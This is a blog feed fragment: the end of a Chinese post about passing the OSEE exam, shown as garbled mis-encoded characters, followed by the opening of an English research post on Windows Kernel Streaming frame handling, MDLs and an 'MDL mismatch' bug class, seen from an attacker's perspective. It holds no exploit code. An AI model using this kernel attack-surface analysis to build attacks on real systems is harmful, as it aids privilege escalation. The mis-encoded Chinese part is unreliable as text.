OSEEï¼Œä½†æˆ‘ç¾åœ¨è¦ºå¾—æ‡‰è©²è¦ç©ã€ŒOSEE Speedrunã€æ‰æœ‰æ„ç¾©ã€‚é€™å¹¾å¤©æˆ‘åŸºæœ¬ä¸Šé‚„æ˜¯æ­£å¸¸ç”Ÿæ´»ï¼ˆæ‰£é™¤ä¸€ç›´æœ‰å° webcam æœƒç…§è‘—ä½ çš„éƒ¨åˆ†ï¼Œé‚„ç®—æ­£å¸¸ï¼‰ï¼Œé‚„æœ‰ç©ºç·´ç´ï¼Œå¦‚æœç¬¬ä¸€å¤©ä¸è¦è€ç™½ç—´çš„è©±ï¼Œå¥½åƒçœŸçš„æœ‰æ©Ÿæœƒä¸€å¤©è§£å®Œã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ™‚é–“ç·š
    &lt;ul&gt;
      &lt;li&gt;2/24 08:00:00ï¼šæ—©ä¸Šå…«é»é–‹å§‹è€ƒè©¦&lt;/li&gt;
      &lt;li&gt;2/25 14:04:52ï¼šè§£æ‰ç¬¬äºŒé¡Œ&lt;/li&gt;
      &lt;li&gt;2/26 02:41:43ï¼šè§£æ‰ç¬¬ä¸€é¡Œï¼Œç ´å°&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ¥ä¸‹ä¾†å‰©ä¸‹çš„æ™‚é–“ï¼Œå°±æ˜¯ç”¨ä¾†å°ˆå¿ƒæ’°å¯«å ±å‘Šã€‚
å‰é¢æåˆ°ï¼Œè€ƒç”Ÿå¿…é ˆåœ¨ &lt;strong&gt;72 å°æ™‚å…§å®Œæˆ exploit&lt;/strong&gt;ï¼Œä¸¦åœ¨æ¥ä¸‹ä¾† &lt;strong&gt;24 å°æ™‚å…§å®Œæˆå ±å‘Š&lt;/strong&gt;ã€‚ä½†å¯¦éš›ä¸Šï¼Œæ™‚é–“æ ¹æœ¬æ²’é‚£éº¼å……è£•ï¼ŒåŸå› åœ¨æ–¼ OSEE çš„å ±å‘Šè¦æ±‚éå¸¸åš´æ ¼ã€‚&lt;/p&gt;

&lt;p&gt;ä»¥å®˜æ–¹æä¾›çš„ç¯„æœ¬ &lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt; ç‚ºä¾‹ï¼Œå¯ä»¥ç™¼ç¾æ•´ä»½å ±å‘Šçš„çµæ§‹è¢«åŠƒåˆ†å¾—éå¸¸ç´°ç·»ï¼Œæ¯”å¦‚ï¼šã€Œ2.2 Initial Exploitationã€ã€ã€Œ2.3 Read and Write Primitiveã€ã€ã€Œ2.4 Code Executionã€ã€ã€Œ2.5 Sandbox Escapeã€ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;å¹³æ™‚è‡ªå·±å¯« exploitï¼Œé€šå¸¸éƒ½æ˜¯é †é †å¯«åˆ°åº•ï¼Œå¾ˆå°‘æœƒç‰¹æ„å»ç´€éŒ„ä¸­é–“æ¯å€‹ç´°ç¯€ã€‚ä½†åœ¨è€ƒè©¦ä¸­ï¼Œå¿…é ˆæ¸…æ¥šæ‹†è§£æ¯ä¸€å€‹éšæ®µï¼Œä¸åƒ…è¦èªªæ˜è‡ªå·±æ˜¯æ€éº¼åˆ©ç”¨æ¼æ´çš„ï¼Œé‚„å¿…é ˆå…·é«”è­‰æ˜è‡ªå·±ç¹éäº†å“ªäº›ä¿è­·æ©Ÿåˆ¶ï¼Œä¸¦ä¸”é™„ä¸Šå¯ä»¥ç›´æ¥è¤‡è£½è²¼ä¸Šå°±èƒ½å¤ åŸ·è¡Œçš„ç¨‹å¼ç¢¼ã€‚ä¾‹å¦‚ï¼Œã€ŒRead and Write Primitiveã€é€™å€‹éšæ®µï¼Œå¹³å¸¸æˆ‘å€‘å¯èƒ½åªæ˜¯åœ¨é–‹ç™¼éç¨‹ä¸­ç¢ºèªä¸€ä¸‹å°±ç¹¼çºŒæ¨é€²äº†ï¼Œå¾ˆå°‘æœƒç‰¹åˆ¥åœä¸‹ä¾†åšç¨ç«‹é©—è­‰ã€‚ä½†åœ¨å ±å‘Šä¸­ï¼Œä½ å¿…é ˆè­‰æ˜è‡ªå·±å…·å‚™é€™å€‹èƒ½åŠ›ã€‚å¸¸è¦‹çš„åšæ³•æ˜¯æ’°å¯«å°å‹ PoCï¼Œè®€å¯«ä¸€å¡Šä¸å¯å­˜å–çš„è¨˜æ†¶é«”ï¼Œä¸¦æ­é… Debugger æˆªåœ–ä½œç‚ºä½è­‰ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œ&lt;strong&gt;è€ƒè©¦æ©Ÿå™¨åªé–‹æ”¾ 72 å°æ™‚ä½¿ç”¨ï¼Œè€Œä¸”æ‰€æœ‰è³‡æ–™éƒ½ç¦æ­¢ä¸‹è¼‰&lt;/strong&gt;ã€‚é€™è¡¨ç¤ºï¼šå¦‚æœ 72 å°æ™‚å…§æ²’æœ‰æ”¶é›†é½Šå…¨æ‰€æœ‰å¿…é ˆçš„æˆªåœ–ã€è­‰æ“šå’Œä¸­é–“éç¨‹ï¼Œä¹‹å¾Œåœ¨å¯«å ±å‘Šæ™‚å°±æœƒéå¸¸ç—›è‹¦ï¼Œç”šè‡³å¯èƒ½å› ç‚ºè­‰æ“šä¸è¶³å°è‡´ç„¡æ³•é€šéã€‚å› æ­¤ï¼Œåœ¨å¯«å ±å‘Šæ™‚æ‰å»æ‹†åˆ†æ¯å€‹éšæ®µçš„ PoC æ˜¯ä¸å¯èƒ½çš„ï¼Œå› ç‚ºé€™æ¨£æœƒç¼ºå°‘å¿…è¦çš„æˆªåœ–ï¼Œç”šè‡³ç„¡æ³•é©—è­‰ PoC æ˜¯å¦èƒ½æ­£å¸¸åŸ·è¡Œã€‚æœ€ä¿éšªçš„ç­–ç•¥æ˜¯ï¼š&lt;strong&gt;åœ¨ 72 å°æ™‚å…§ï¼Œä¸åªæ˜¯å®Œæˆ exploitï¼Œä¹Ÿè¦åŒæ­¥æ’°å¯« PoCï¼Œæ”¶é›†å®Œæ‰€æœ‰è³‡æ–™ï¼Œä¸¦æŠŠå ±å‘Šçš„ä¸»è¦å…§å®¹è‰æ“¬å‡ºä¾†ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;è€Œä¸”çœŸçš„æœ‰äººå› ç‚ºå ±å‘Šä¸å¤ è©³ç›¡ï¼Œå³ä½¿åœ¨è§£é¡Œéšæ®µæ‹¿äº† 100 åˆ†ä¹Ÿæ²’æœ‰é€šéï¼Œæ‰€ä»¥æˆ‘åš‡å¾—ç›´æ¥äº¤äº†ä¸€ç™¾é çš„å ±å‘Šå‡ºå»ã€‚&lt;/p&gt;
&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;æŠŠæ‰€æœ‰ exploit å’Œå ±å‘Šéƒ½æ•´ç†å¥½äº¤å‡ºå»ä¹‹å¾Œï¼Œå°±åªå‰©ç­‰å¾… OffSec å…¬å‘Šè€ƒè©¦çµæœäº†ã€‚å®˜æ–¹èªªå¯©æ ¸å¯èƒ½éœ€è¦æœ€å¤šåå€‹å·¥ä½œå¤©ï¼Œæˆ‘ä¸€è·¯ç­‰åˆ°äº† 3 æœˆ 10 è™Ÿï¼Œçµ‚æ–¼æ”¶åˆ°é€šéçš„é€šçŸ¥ã€‚
æ“šèªªé€™æ˜¯å…¨å°ç£ç¬¬ä¸€å¼µ OSEE è­‰ç…§ï¼Œç®—æ˜¯é †åˆ©è§£é–äº†ä¸€å€‹æˆå°±ï¼š
&lt;img src=&quot;/assets/img/blog/20250522/upload_b03d6106afb193bc29194272198cf43b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦å¤–ï¼Œä»Šå¹´å…«æœˆï¼ŒDEVCORE ä¹Ÿå°‡ç¹¼çºŒæ‰¿è¾¦ OffSec çš„ Live Trainingã€‚  ä»Šå¹´é–‹è¨­çš„èª²ç¨‹åŒ…æ‹¬å…©é–€ Advanced ç­‰ç´šå’Œä¸€é–€ Expert ç­‰ç´šçš„èª²ç¨‹ï¼Œåˆ†åˆ¥æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PEN-300&lt;/strong&gt;ï¼ˆAdvanced Evasion Techniques and Breaching Defensesï¼‰&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;WEB-300&lt;/strong&gt;ï¼ˆAdvanced Web Attacks and Exploitationï¼‰&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;EXP-401&lt;/strong&gt;ï¼ˆAdvanced Windows Exploitationï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦‚æœæœ‰èˆˆè¶£åƒåŠ ï¼Œå»ºè­°å¯ä»¥æ—©é»å ±åï¼Œå› ç‚ºæ—©é³¥ç¥¨åƒ¹ç›¸å°éå¸¸åˆ’ç®—ï¼ˆéš¨è‘—æ™‚é–“æ¥è¿‘ï¼Œåƒ¹æ ¼æœƒé€æ­¥ä¸Šå‡ï¼‰ã€‚&lt;br /&gt;
è©³ç´°è³‡è¨Šå¯ä»¥åƒè€ƒå®˜æ–¹ç¶²ç«™ï¼š&lt;a href=&quot;https://training.devco.re/2025&quot;&gt;DEVCORE &amp;amp; OffSec Live Training&lt;/a&gt;ã€‚
&lt;img src=&quot;/assets/img/blog/20250522/upload_b7cab66943df4921db18bbd3c37487f8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/</link>
                <guid>https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge</guid>
                <pubDate>Thu, 22 May 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Frame by Frame, Kernel Streaming Keeps Giving Vulnerabilities</title>
                <description>&lt;p&gt;This is a series of research related to Kernel Streaming attack surface. It is recommended to read the following articles first.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Welcome to Part III of my series on streaming vulnerabilities in the Windows kernel. This research was also presented at &lt;a href=&quot;https://www.offensivecon.org/agenda/2025.html&quot;&gt;OffensiveCon 2025&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Over the past year, we uncovered an overlooked bug class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Proxying to Kernel&lt;/code&gt;, which led to severe consequences, making exploitation straightforward in Windows kernel. However, this is just the tip of the iceberg for Kernel Streaming.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After discovering several vulnerabilities â€” including those related to the Proxying series â€” in Kernel Streaming, we decided to dive deeper into its internals. Between late 2023 and the end of 2024, we identified over 20 vulnerabilities. Approximately 14 of them are related to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;, with most occurring during frame handling. In this post, Iâ€™ll focus on these frame-related issues.&lt;/p&gt;

&lt;p&gt;Letâ€™s talk about kernel streaming frame.&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming-frame&quot;&gt;Brief overview of Kernel Streaming Frame&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Kernel Streaming, when reading data from a device, Kernel Streaming will allocate KS frame to carry streaming data such as video or audio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;struct _KSPFRAME_HEADER
{
  _LIST_ENTRY ListEntry;
  _KSPFRAME_HEADER *NextFrameHeaderInIrp;
  void *Queue;
  _IRP *OriginalIrp;
  _MDL *Mdl;
  _IRP *Irp;
  KSPIRP_FRAMING_ *IrpFraming;
  KSSTREAM_HEADER *StreamHeader;
  void *FrameBuffer;
  KSPMAPPINGS_TABLE *MappingsTable;
  unsigned int StreamHeaderSize;
  unsigned int FrameBufferSize;
  void *Context;
  int RefCount;
  void *OriginalData;
  void *BufferedData;
  int Status;
  unsigned __int8 DismissalCall;
  _KSPFRAME_HEADER_TYPE Type;
  _KSPSTREAM_POINTER *FrameHolder;
  unsigned int OriginalOptionsFlags;
  _KSPMDLCACHED_STREAM_POINTER *MdlCaching;
};

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The frame buffer inside the KS frame stores the actual image or audio data. Most frame buffers are described by a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_mdl&quot;&gt;Memory Descriptor List (MDL)&lt;/a&gt; that maps their physical memory. If youâ€™re not familiar with what an MDL is, donâ€™t worry â€” hereâ€™s a quick overview.&lt;/p&gt;

&lt;h3 id=&quot;mdl&quot;&gt;MDL&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MDL (Memory Descriptor List)&lt;/code&gt; is a kernel-mode structure used in Windows to describe the physical pages backing a virtual memory buffer. It allows kernel components and drivers to perform direct memory access (DMA) and safely share buffers across different contexts. MDLs are widely used throughout the Windows kernel, commonly in conjunction with IRPs during &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-direct-i-o&quot;&gt;Direct I/O&lt;/a&gt;, as well as in file system and network drivers during data transfer operations.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MDL (Memory Descriptor List)&lt;/code&gt; structure is defined as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;typedef struct _MDL {
  struct _MDL      *Next;
  CSHORT           Size;
  CSHORT           MdlFlags;
  struct _EPROCESS *Process;
  PVOID            MappedSystemVa;
  PVOID            StartVa;
  ULONG            ByteCount;
  ULONG            ByteOffset;
  ULONG64          PFN[];  // Variable-length array of page frame numbers

} MDL, *PMDL;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is a variable-sized structure, where the &lt;strong&gt;PFN (Page Frame Numbers)&lt;/strong&gt; array is stored at the end of the MDL. Each PFN represents the physical page corresponding to a  the virtual buffer described by the MDL.&lt;/p&gt;

&lt;p&gt;In Kernel Streaming, an MDL describes a buffer that is mapped into user space and kernel space, and both mappings refer to the same physical memory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As a result, when data is read from a device, it is written to both the user-mode and kernel-mode buffers at the same time.&lt;/p&gt;

&lt;p&gt;Letâ€™s take a quick look at how MDLs are typically used.&lt;/p&gt;

&lt;h4 id=&quot;basic-usage-of-mdl&quot;&gt;Basic Usage of MDL&lt;/h4&gt;

&lt;p&gt;When the kernel needs to access user-mode memory â€” especially at elevated IRQL levels such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt; or within a DPC â€” it often relies on an MDL to safely describe and lock that memory. Typically, this process invokes the set of APIs shown in the diagram below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ioallocatemdl&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-ioallocatemdl&quot;&gt;IoAllocateMDL&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First, the kernel calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; to allocate an MDL structure, initializing it to describe a buffer based on the provided virtual address and length. &lt;strong&gt;But it does not initialize the PFN (Page Frame Number) array in the MDL.&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;mmprobeandlockpages&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, the kernel calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; to lock the physical pages corresponding to the virtual address range, and to populate the PFN (Page Frame Number) array inside the MDL.&lt;/p&gt;

&lt;h4 id=&quot;mmmaplockedpagesspecifycache&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmaplockedpagesspecifycache&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the kernel needs to access the memory, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; to map a new virtual address &lt;strong&gt;using the PFNs stored in the MDL&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;By the way, itâ€™s also possible to map kernel buffers into user space using this API.&lt;/p&gt;

&lt;h4 id=&quot;mmunlockpagesiofreemdl&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmunlockpages&quot;&gt;MmUnlockPages&lt;/a&gt;/&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iofreemdl&quot;&gt;IoFreeMdl&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;After the kernel has finished using the buffer mapped through the MDL, it must call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmUnlockPages&lt;/code&gt; to release the locked physical pages. Finally, the MDL itself should be freed using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoFreeMdl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For the purposes of this post, itâ€™s enough to understand that Kernel Streaming uses MDLs to manage frame buffers shared between user space and kernel space.&lt;/p&gt;

&lt;p&gt;If youâ€™re interested in more details about MDL, here are some helpful references:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls&quot;&gt;Using MDLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@WaterBucket/understanding-memory-descriptor-lists-mdls-for-windows-vulnerability-research-exploit-7de8729caee7&quot;&gt;Understanding Memory Descriptor Lists (MDLs) for Windows Vulnerability Research &amp;amp; Exploit Development&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Next, letâ€™s take a look at how a typical application reads data from a webcam â€” and how Kernel Streaming implements this functionality under the hood.&lt;/p&gt;

&lt;h3 id=&quot;how-to-read-streams-from-webcam&quot;&gt;How to Read Streams from webcam&lt;/h3&gt;

&lt;p&gt;Here is a simplified overview of the workflow for reading a video stream from a webcam using Kernel Streaming:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the device to obtain a handle to the webcam device.&lt;/li&gt;
  &lt;li&gt;Use this device handle to create an instance of the Pin on this filter and obtain the Pin handle.&lt;/li&gt;
  &lt;li&gt;Set the Pinâ€™s state to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RUN&lt;/code&gt; using &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt;. When the Pin enters the RUN state, the webcamâ€™s indicator light usually turns on, indicating that the device is active and ready to stream.&lt;/li&gt;
  &lt;li&gt;Finally, you can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; to read data from this Pin. When sending the IOCTL to read the stream, we need to provide a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-ksstream_header&quot;&gt;KSSTREAM_HEADER&lt;/a&gt; structure as input to specify the necessary information.&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;typedef struct {
  ULONG    Size;
  ULONG    TypeSpecificFlags;
  KSTIME   PresentationTime;
  LONGLONG Duration;
  ULONG    FrameExtent; //Buffer Size
  ULONG    DataUsed; 
  PVOID    Data; // point to image Buffer
  ULONG    OptionsFlags;
  ULONG    Reserved;
} KSSTREAM_HEADER, *PKSSTREAM_HEADER;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The kernel will use this structure to copy data from the device into memory. The most important fields are the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt;, which points to your user-space buffer, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameExtent&lt;/code&gt;, which indicates the size of the buffer. Kernel Streaming will map a frame buffer based on these values and write the image data into the memory region you provided.  Optionally, you can also use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field to describe the attributes of the frame.&lt;/p&gt;

&lt;h3 id=&quot;stream-reading-in-kernel-streaming&quot;&gt;Stream Reading in Kernel Streaming&lt;/h3&gt;
&lt;p&gt;Letâ€™s briefly introduce how ks implements reading a frame.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First, a buffer must be allocated in user space to store the incoming image data.
Then, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structure is prepared, containing the bufferâ€™s address and size, and passed to the kernel via an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_READ_STREAM&lt;/code&gt;. When this IOCTL is sent to the webcam device, it is handled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;. If the request does not originate from a WoW64 process, it will be passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; for further processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; receives the request, it parses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt;, creates an MDL based on the provided buffer and size, and insert it to the IRP. The user-space buffer is then mapped into kernel space as a frame buffer through this MDL. At this point, both the user buffer and the frame buffer point to the same physical memory, enabling efficient zero-copy data transfers between user space and kernel space.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; allocates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS Frame (_KSPFRAME_HEADER)&lt;/code&gt; in kernel. This structure contains the associated MDL, a pointer to the frame buffer, the buffer size, and other metadata used for managing the streaming operation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; is then placed into an internal queue, where it waits to be filled with data.
Next, the Kernel Streaming worker thread dequeues a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; and begins capturing image data from the device into the associated frame buffer. Any remaining &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; structures in the queue will be processed one by one in the order they were enqueued.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By the way, itâ€™s also possible to submit multiple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structures in a single IOCTL call to request multiple frames. In that case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will process each frame request in order, based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; array provided in the input buffer. Each frame has a &lt;strong&gt;one-to-one mapping with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt;, an MDL, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;With the basics of the architecture and frame reading in place, we can now examine things from an attackerâ€™s point of view.&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-perspective&quot;&gt;From Attackerâ€™s Perspective&lt;/h3&gt;

&lt;p&gt;So, where should we focus our attention?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first and most intuitive target is the transition between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;.When 32-bit requests are converted to 64-bit, improper handling of user-controlled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structures may lead to memory corruption â€” for example, &lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;CVE-2024-38054&lt;/a&gt; is one such case. This transition layer can also introduce inconsistency issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another interesting target is how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; manages frame buffers. If MDLs are &lt;strong&gt;misused&lt;/strong&gt; during frame buffer handling, it can result in various forms of memory corruption. Weâ€™ll examine some examples of these issues later.&lt;/p&gt;

&lt;p&gt;In the course of our research on Kernel Streaming, we identified several new bug classes worth highlighting.&lt;/p&gt;

&lt;h2 id=&quot;new-bug-classes-in-kernel-streaming&quot;&gt;New Bug Classes in Kernel Streaming&lt;/h2&gt;

&lt;p&gt;The first bug class we identified is MDL mismatch.&lt;/p&gt;

&lt;h3 id=&quot;mdl-mismatch&quot;&gt;MDL Mismatch&lt;/h3&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; receives a 32-bit request, it not only converts the request to its 64-bit equivalent, but also pre-allocates an MDL to describe the frame buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As illustrated in the diagram, when a 32-bit request is issued, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; is the first to handle it. During this step, it sets up the MDL and performs the mapping for the frame buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; completes its preprocessing, it passes the IRP to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; for further handling. Since the MDL has already been created by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will &lt;strong&gt;not&lt;/strong&gt; allocate a new one. At this point, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; is allocated to represent the frame within the Kernel Streaming framework.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

